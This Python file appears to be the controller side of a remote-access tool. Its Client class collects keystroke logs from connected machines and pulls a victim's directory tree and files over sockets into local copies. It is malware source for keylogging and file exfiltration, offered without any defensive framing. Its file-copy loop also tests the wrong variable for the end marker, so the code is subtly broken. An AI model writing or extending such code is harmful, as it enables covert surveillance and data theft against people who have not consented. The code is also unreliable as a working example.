import json
import random
import threading

BUFFER_SIZE = 1024 * 128
SEPARATOR = "<sep>"


class Client:
    def __init__(self,id_client,ui):
        self.id = id_client
        self.ui = ui
        self.t1 = None
        self.t2 = None
        self.cnt = 0
    def key_logger(self,socket):
        while True:
            output = socket.recv(BUFFER_SIZE).decode()
            str1, str2 = output.split(SEPARATOR)
            print(f"receive log of {self.id}")
            with open(f'{str1}.txt', "a", encoding='utf-8') as file:
                try:

                    file.write(f"{str2}\n")
                    self.ui.keylog_window[self.id].addLine(str2)
                except Exception as e:
                    print(f"Error logging key: {e}")

    def manage_file(self,socket):
        data = b""
        while True:
            chunk = socket.recv(4096)
            if b"<end>" in chunk:
                data += chunk.split(b"<end>")[0]
                break
            data += chunk

        try:
            directory_tree = json.loads(data.decode())
            print(f"receive tree of {self.id}")
            self.ui.manage_file_window[self.id].populate_tree_view(directory_tree)
        except json.JSONDecodeError as e:
            print(f"Error decoding JSON: {e}")

        while True:
            file_name_length = socket.recv(4)  # Expecting the length of the file name
            if not file_name_length:
                return

            file_name_length = int.from_bytes(file_name_length, 'big')  # Convert bytes to int
            filename = "copy_" + str(random.randint(1, 1000)) + "_" + socket.recv(file_name_length).decode()
            try:
                print(f"Copy file {filename}")
                with open(filename, 'wb') as f:
                    while True:
                        data = socket.recv(BUFFER_SIZE)
                        if b"<end>" in chunk:
                            f.write(data.split(b"<end>")[0])
                            break
                        f.write(data)
            except OSError as e:
                print("")

    def add_keylog(self,socket2):
        self.t1 = threading.Thread(target=self.key_logger, args=(socket2,))
        self.t1.start()
    def add_manage_file(self,socket3):
        self.t2 = threading.Thread(target=self.manage_file, args=(socket3,))
        self.t2.start()
    def increase(self):
        self.cnt+=1


